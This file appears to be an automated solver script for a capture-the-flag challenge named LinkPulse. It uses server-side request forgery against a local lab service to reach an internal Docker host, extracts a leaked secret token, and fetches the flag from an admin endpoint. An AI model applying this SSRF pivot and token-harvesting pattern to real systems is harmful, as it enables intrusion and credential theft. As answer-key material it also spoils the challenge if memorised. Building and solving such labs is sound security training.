#!/usr/bin/env python3
"""
Automated Exploit Solver for Challenge 2: LinkPulse (Medium)
Vulnerability: SSRF with Blacklist Bypass -> Docker Internal Network Microservice Pivot
"""
import requests
import json
import re
import sys

TARGET_URL = "http://localhost:8002/api/ping"

def send_ssrf(url: str):
    res = requests.post(TARGET_URL, json={"url": url}, timeout=5)
    return res.json()

def solve():
    print("[*] Testing Challenge 2: LinkPulse SSRF Exploit...")

    # Step 1: Probe internal service name on the Docker network
    internal_target = "http://internal-vault:5000"
    print(f"[*] Probing internal service: {internal_target}")
    
    data = send_ssrf(f"{internal_target}/")
    print(f"[+] Root response: {data.get('body', '')}")
    
    # Step 2: Read internal API documentation
    print("[*] Fetching /api/docs...")
    docs_data = send_ssrf(f"{internal_target}/api/docs")
    body_text = docs_data.get("body", "")
    print(f"[+] Documentation leaked: {body_text}")
    
    # Extract token
    token_match = re.search(r'corp_internal_secret_\d+', body_text)
    if not token_match:
        print("[-] Could not parse internal token from docs.")
        sys.exit(1)
        
    secret_token = token_match.group(0)
    print(f"[+] Discovered Secret Token: {secret_token}")

    # Step 3: Fetch flag from admin endpoint
    flag_url = f"{internal_target}/api/v1/admin/flag?token={secret_token}"
    print(f"[*] Requesting flag endpoint: {flag_url}")
    flag_resp = send_ssrf(flag_url)
    flag_body = flag_resp.get("body", "")
    print(f"[+] Received Flag Response: {flag_body}")

    flag_match = re.search(r'CTF\{[^}]+\}', flag_body)
    if flag_match:
        print(f"\n[SUCCESS] Extracted Flag: {flag_match.group(0)}")
        return flag_match.group(0)
    else:
        print("[-] Flag extraction failed.")
        sys.exit(1)

if __name__ == "__main__":
    solve()
